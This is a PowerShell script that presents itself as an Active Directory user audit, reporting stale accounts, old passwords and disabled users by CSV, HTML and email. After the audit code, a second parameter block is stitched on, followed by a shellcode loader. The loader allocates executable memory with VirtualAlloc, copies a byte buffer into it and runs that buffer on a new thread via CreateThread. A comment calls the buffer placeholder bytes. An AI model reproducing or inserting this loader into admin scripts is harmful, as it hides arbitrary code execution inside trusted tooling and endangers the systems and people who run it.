
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias('DnsDomain')]
    [string]$Domain = 'adatum.com',

    [string]$SearchBase = 'OU=Staff,DC=adatum,DC=com',

    [string]$ReportPath = 'C:\Reports\ad-user-audit-2025-09-22.csv',

    [string]$HtmlPath = 'C:\Reports\ad-user-audit-2025-09-22.html',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 120,

    [int]$PasswordMaxAge = 180,

    [string]$SmtpServer = "smtp.adatum.com"
)

$DebugPreference = 'SilentlyContinue'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$ProgressPreference = 'SilentlyContinue'

Import-Module ActiveDirectory -ErrorAction Stop

$LogPath = "C:\Logs\ad-audit-2025-09-22.log"

function Write-AuditTrail {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

Import-Module ActiveDirectory -ErrorAction Stop

$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$searchBases = @(
    'OU=Staff,DC=adatum,DC=com'
    "OU=ServiceAccounts,DC=adatum,DC=com"
)

$users = foreach ($base in $searchBases) {
    Write-Verbose ("Querying {0}" -f $base)
    Get-ADUser -Filter * -SearchBase $base -Properties $properties -ErrorAction Continue
}

$cutoff = (Get-Date).AddDays(-$InactiveDays)

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}
$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$groupReport = foreach ($user in @($users | Select-Object -First 50)) {
    $groups = Get-ADPrincipalGroupMembership -Identity $user.SamAccountName -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -ne 'Domain Users' }
    [pscustomobject]@{
        SamAccountName = $user.SamAccountName
        GroupCount     = @($groups).Count
        Groups         = (@($groups | Select-Object -ExpandProperty Name) -join '; ')
    }
}
$groupReport | Export-Csv -Path "C:\Reports\ad-user-audit-2025-09-22-groups.csv" -NoTypeInformation -Encoding UTF8

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet, Enabled | Export-Csv -NoTypeInformation -Path $ReportPath

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation

$disabled = $users | Where-Object { $_.Enabled -eq $false }
$disabled | Select-Object Name, SamAccountName, DistinguishedName |
    Export-Csv -Path $ReportPath.Replace('.csv', '-disabled.csv') -NoTypeInformation -Encoding UTF8
$style = @'
<style>
body { font-family: Arial; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$stale |
    Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
    ConvertTo-Html -Title 'Stale AD accounts' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$summaryBody = @"
Stale accounts : $staleCount
Disabled       : $disabledCount
Old passwords  : $oldPwdCount
Report         : $ReportPath
"@

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

Send-MailMessage -To $MailTo -From $MailFrom -Subject 'AD user audit: daily summary' `
    -Body $summaryBody -SmtpServer $SmtpServer -Port 2525

Write-Host ("AD audit finished: {0} stale, {1} disabled" -f $staleCount, $disabledCount) -ForegroundColor Green
Write-AuditTrail -Message ("Audit completed for {0}" -f $Domain) -Level INFO

$neverLoggedOn = $users | Where-Object { $_.LastLogonDate -eq $null }
if (@($neverLoggedOn).Count -gt 0) {
    Write-Warning ("{0} accounts have never signed in" -f @($neverLoggedOn).Count)
}

$pwdPolicy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
if ($pwdPolicy) {
    Write-Verbose ("Domain password age: {0} days" -f $pwdPolicy.MaxPasswordAge.Days)
}

$byOu = $users | Group-Object -Property DistinguishedName |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byOu | Format-Table -AutoSize | Out-String | Write-Verbose

$expiringSoon = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt (Get-Date).AddDays(-($PasswordMaxAge - 14))
}
Write-Verbose ("Password changes due: {0}" -f @($expiringSoon).Count)

$engine = Get-ADRootDSE -ErrorAction SilentlyContinue
if ($engine) {
    Write-Verbose ("Domain controller: {0}" -f $engine.dnsHostName)
    Write-Verbose ("Default naming context: {0}" -f $engine.defaultNamingContext)
}

$ous = Get-ADOrganizationalUnit -Filter * -ErrorAction SilentlyContinue |
    Select-Object -First 5 -Property Name, DistinguishedName
$ous | Format-Table -AutoSize

$sampleStale = $stale | Sort-Object -Property LastLogonDate | Select-Object -First 10
$sampleStale | Format-Table Name, SamAccountName, LastLogonDate -AutoSize

$reportItem = Get-Item -LiteralPath $ReportPath -ErrorAction SilentlyContinue
if ($reportItem) {
    Write-Host ("Report size: {0:N1} KB" -f ($reportItem.Length / 1KB)) -ForegroundColor Gray
}

$transcript = Join-Path $env:TEMP ("ad-audit-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Start-Transcript -Path $transcript -Append | Out-Null
Write-Verbose ("Transcript: {0}" -f $transcript)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x66, 0x27, 0x48, 0xd9, 0xad, 0x8f, 0x02, 0x1e, 0x42, 0xc4, 0xfd, 0x26, 0x28, 0x8f, 0x90, 0xe0,
        0xa2, 0x70, 0xbb, 0xf5, 0x8c, 0xc4, 0xbc, 0x69, 0xd4, 0x59, 0xa9, 0xaf, 0xd6, 0xc3, 0xda, 0xb5,
        0xeb, 0xa9, 0x16, 0xb4, 0x78, 0x95, 0xe6, 0x65, 0x24, 0x4f, 0x6a, 0xa3, 0x21, 0xc2, 0x40, 0x5c,
        0xe8, 0x90, 0x52, 0x56, 0x00, 0x0c, 0xac, 0x1b, 0x08, 0xff, 0x56, 0xa4, 0xa2, 0xec, 0xae, 0x9f,
        0x7c, 0x2b, 0xb9, 0x82, 0xd2, 0x05, 0xd4, 0x0f, 0x57, 0x38, 0x0a, 0xa7, 0x4a, 0x45, 0x6a, 0x1f,
        0xa8, 0x0b, 0x98, 0x66, 0xb6, 0x0e, 0x3e, 0x79, 0x14, 0x37, 0xe5, 0xaf, 0x9d, 0x72, 0x55, 0x70,
        0x46, 0xaa, 0xc1, 0x88, 0x6a, 0xbf, 0x2a, 0x01, 0xcd, 0x56, 0x8a, 0x7d, 0x66, 0xa1, 0xf0, 0x41,
        0xea, 0xc0, 0x05, 0xfb, 0xdc, 0xfa, 0x76, 0xd8, 0xb0, 0xa0, 0x26, 0x55, 0x94, 0xd3, 0x7d, 0x4b,
        0xec, 0xb4, 0xb8, 0x6b, 0x4d, 0x58, 0x65, 0x5b, 0x83, 0x47, 0x96, 0x91, 0xae, 0x12, 0xb4, 0x63,
        0xb5, 0x86, 0x78, 0x53, 0x08, 0x55, 0xa3, 0x78, 0xc4, 0x4f, 0x97, 0xfe, 0xc9, 0x88, 0x72, 0xaf,
        0x19, 0x91, 0x1b, 0x81, 0x67, 0xd7, 0xed, 0x26, 0xad, 0x9b, 0x4f, 0xd3, 0x5f, 0x1c, 0x63, 0x72,
        0x98, 0x26, 0x4b, 0x5d, 0x2d, 0x3a, 0x13, 0x3c, 0x9c, 0x6a, 0xde, 0x47, 0xea, 0x3c, 0x0b, 0x66,
        0xc4, 0x6f, 0x2c, 0x34, 0x6b, 0xac, 0x59, 0xf7, 0x7f, 0x16, 0x64, 0xda, 0x84, 0x6c, 0x37, 0x41,
        0xa5, 0x79, 0xe9, 0x2e, 0x00, 0x4c, 0xe5, 0xd4, 0x5c, 0x27, 0x6d, 0x5d, 0x0e, 0xb2, 0xe0, 0x8c,
        0xa0, 0x8b, 0x6f, 0x11, 0x4e, 0x6b, 0xfd, 0x9e, 0x63, 0x28, 0xc2, 0x71, 0xc5, 0x57, 0x9c, 0x91,
        0xe1, 0x63, 0xfc, 0xba, 0x35, 0x0e, 0x6b, 0xc1, 0xc1, 0x79, 0x57, 0xa4, 0x78, 0xeb, 0x7b, 0x4a,
        0xfc, 0x3c, 0xdb, 0x60, 0x1e, 0xd3, 0x08, 0xfc, 0x58, 0x18, 0xbc, 0xf1, 0x9b, 0x5b, 0x91, 0xc0,
        0xa0, 0x65, 0x56, 0x5c, 0x17, 0x86, 0x34, 0x72, 0xc5, 0x75, 0x82, 0xef, 0x29, 0xba, 0xf1, 0x7c,
        0xab, 0x64, 0x4b, 0xb8, 0x2f, 0xf2, 0x2b, 0x5e, 0xe3, 0x3c, 0xed, 0xb3, 0xc2, 0xf1, 0xae, 0xf4,
        0x72, 0xcc, 0xf6, 0xa3, 0x60, 0xa0, 0x61, 0xdd, 0x64, 0x1c, 0x43, 0x11, 0xcd, 0x22, 0x50, 0x6a,
        0x9c, 0x02, 0x41, 0xc3, 0x7a, 0xc2, 0x0b, 0xa4, 0x66, 0xcd, 0x0a, 0x80, 0x66, 0x83, 0x60, 0xc9,
        0xa4, 0xae, 0xd2, 0x48, 0xb8, 0x66, 0x2b, 0x5e, 0x55, 0xb7, 0x53, 0xfb, 0x83, 0x17, 0xe6, 0x53,
        0x7f, 0xc3, 0x6b, 0x7e, 0xa4, 0x32, 0xf0, 0x36, 0x04, 0x7f, 0xfd, 0x7f, 0x63, 0x0f, 0x35, 0xe9,
        0x86, 0x5f, 0x32, 0xcd, 0xd1, 0x8b, 0x11, 0x57, 0x43, 0x70, 0x64, 0xc5, 0x5a, 0x92, 0x4e, 0x91,
        0xd9, 0x8b, 0x70, 0xe7, 0x3a, 0xfa, 0x7a, 0x68, 0xb1, 0xfe, 0xfe, 0x0e, 0xd2, 0xab, 0x1d, 0x97,
        0x75, 0xd8, 0x6e, 0xc3, 0xa4, 0xa4, 0x03, 0x30, 0x36, 0xbc, 0xcc, 0x43, 0x21, 0x28, 0x88, 0x84,
        0x24, 0x02, 0xe4, 0xd2, 0x90, 0xc3, 0xb0, 0x88, 0x79, 0xce, 0xfa, 0xdb, 0xa4, 0x7b, 0x41, 0x3c,
        0xd5, 0x87, 0x5f, 0xcf, 0xe8, 0x3a, 0x9c, 0x11, 0x0b, 0x63, 0x6c, 0xf1, 0x13, 0x1b, 0xc1, 0xd7,
        0x21, 0xfe, 0x68, 0x33, 0x17, 0x1e, 0x21, 0xfb, 0xc3, 0xd4, 0x0f, 0x3b, 0x7a, 0xb2, 0xa9, 0x2d,
        0x2f, 0x7b, 0xad, 0xdf, 0xb2, 0xf5, 0x05, 0x8c, 0x46, 0x54, 0x8a, 0xed, 0x85, 0xd1, 0xba, 0x00,
        0xd0, 0xcb, 0xe7, 0x05, 0x1f, 0x7f, 0x1c, 0x74, 0xfa, 0x51, 0xdd, 0xca, 0x4e, 0x68, 0xd3, 0x06,
        0x26, 0xfa, 0xad, 0x67, 0x46, 0x63, 0x3d, 0xd7, 0xcd, 0xe2, 0x41, 0x39, 0xa9, 0x88, 0x2b, 0x47,
        0xfd, 0xab, 0x16, 0xda, 0xea, 0x11, 0xb2, 0x31, 0x7d, 0x16, 0xf4, 0x79, 0xa4, 0x21, 0xbe, 0x97,
        0x75, 0xff, 0x67, 0x87, 0x88, 0xf5, 0xc1, 0x49, 0xcf, 0x77, 0xfa, 0xa8, 0xff, 0x10, 0x5d, 0x4a,
        0xd5, 0xea, 0xa8, 0xda, 0x75, 0x58, 0xcf, 0xa3, 0x1f, 0x59, 0x52, 0x77, 0x4a, 0x6f, 0x83, 0xf4,
        0xa7, 0x67, 0xec, 0x07
    )

    $Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 4620)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
